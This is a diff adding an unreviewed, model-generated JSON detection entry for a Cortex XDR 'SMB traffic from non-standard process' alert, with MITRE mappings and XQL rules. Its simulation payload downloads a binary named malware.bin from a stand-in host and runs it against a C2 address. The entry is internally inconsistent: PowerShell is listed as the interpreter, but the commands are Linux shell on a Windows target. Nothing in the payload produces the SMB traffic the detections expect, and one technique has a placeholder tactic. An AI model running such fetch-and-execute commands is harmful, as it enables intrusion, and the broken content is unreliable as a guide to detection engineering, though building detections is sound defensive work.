@@ -1,0 +1,181 @@
+{
+  "id": "TTP-0000-0194",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-11-12T00:00:00Z",
+    "updated_at": "2026-11-12T00:00:00Z",
+    "authors": [
+      {
+        "name": "detdev pipeline (local model, unreviewed)",
+        "role": "generator"
+      }
+    ],
+    "tags": [
+      "generated-draft",
+      "platform-windows",
+      "endpoint",
+      "cortex-analytics-alert"
+    ],
+    "pov_engine": {
+      "auto_load": false,
+      "simulation_class": "endpoint",
+      "destructive": false,
+      "platforms": [
+        "windows"
+      ],
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "SMB Traffic from Non-Standard Process",
+    "summary": "An attacker uses a non-standard process to initiate SMB traffic, bypassing typical security controls. Cortex should detect this behavior as an anomaly in process-to-SMB network connections.",
+    "description": "An attacker uses a non-standard process to initiate SMB traffic, bypassing typical security controls. Cortex should detect this behavior as an anomaly in process-to-SMB network connections."
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1077",
+        "name": "T1077",
+        "tactic_ids": [
+          "TA0000"
+        ]
+      },
+      {
+        "technique_id": "T1021",
+        "subtechnique_id": "T1021.002",
+        "name": "Remote Services: SMB/Windows Admin Shares",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ]
+      },
+      {
+        "technique_id": "T1046",
+        "name": "Network Service Discovery",
+        "tactic_ids": [
+          "TA0007"
+        ],
+        "tactic_names": [
+          "Discovery"
+        ]
+      }
+    ]
+  },
+  "execution": {
+    "target_platform": "windows",
+    "execution_framework": "custom-cortex",
+    "privilege_required": "administrator",
+    "payload": {
+      "interpreter": "powershell",
+      "code": "wget http://192.0.2.10/malware.bin -O /tmp/malware\nchmod +x /tmp/malware\n/tmp/malware --c2 192.0.2.50\n",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "network-connection",
+        "description": "SMB traffic initiated from non-standard process",
+        "expected_value": "action_remote_ip = '192.0.2.50' and dst_port = 445"
+      }
+    ],
+    "cleanup": {
+      "manual_steps": [
+        "Not authored. Write and test cleanup before promotion."
+      ]
+    }
+  },
+  "detections": {
+    "biocs": [
+      {
+        "name": "SMB Traffic from Non-Standard Process",
+        "description": "Detects SMB network connections originating from non-standard processes such as wget or custom binaries",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.50'\n| filter dst_port = 445\n| filter actor_process_image_name != 'svchost.exe' and actor_process_image_name != 'lsass.exe'\n| filter actor_process_image_name != 'explorer.exe'",
+        "mitre_technique_ids": [
+          "T1077",
+          "T1021.002",
+          "T1046"
+        ],
+        "severity": "high",
+        "suppression_window_seconds": 0
+      }
+    ],
+    "abiocs": [
+      {
+        "name": "Unusual SMB Connection from Custom Binary",
+        "description": "Detects SMB traffic initiated by a binary not typically associated with SMB operations",
+        "logic": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.50'\n| filter dst_port = 445\n| filter actor_process_image_name != 'svchost.exe' and actor_process_image_name != 'lsass.exe'\n| filter actor_process_image_name != 'explorer.exe'\n| filter actor_process_image_name contains '/tmp/'",
+        "behavioral_profile": "machine-learning",
+        "causality_anchor": "actor_process_image_name",
+        "mitre_technique_ids": [
+          "T1077",
+          "T1021.002",
+          "T1046"
+        ],
+        "severity": "high"
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "Detect SMB From Non-Standard Process",
+        "query": "dataset = xdr_data\n| filter event_type = ENUM.NETWORK\n| filter action_remote_ip = '192.0.2.50'\n| filter dst_port = 445\n| filter actor_process_image_name != 'svchost.exe' and actor_process_image_name != 'lsass.exe'\n| filter actor_process_image_name != 'explorer.exe'",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      }
+    ],
+    "correlation_rules": [],
+    "iocs": [],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics (XDR Agent) — SMB Traffic from Non-Standard Process; Required Data: XDR Agent. Ref: https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/smb-traffic-from-non-standard-process"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xdr",
+        "submodule": "analytics",
+        "coverage_tier": "detection"
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Cortex XDR Analytics Alert Reference: SMB Traffic from Non-Standard Process",
+      "url": "https://cortex-docs.paloaltonetworks.com/analytics-alerts/alerts-by-name/smb-traffic-from-non-standard-process",
+      "publisher": "Palo Alto Networks",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1077",
+      "url": "https://attack.mitre.org/techniques/T1077/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1021.002",
+      "url": "https://attack.mitre.org/techniques/T1021/002/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    },
+    {
+      "title": "MITRE ATT&CK T1046",
+      "url": "https://attack.mitre.org/techniques/T1046/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-11-12",
+      "author": "detdev pipeline (local model, unreviewed)",
+      "change": "Generated draft. Built from the model fragment and its recorded source only; not reviewed, not run."
+    }
+  ]
+}
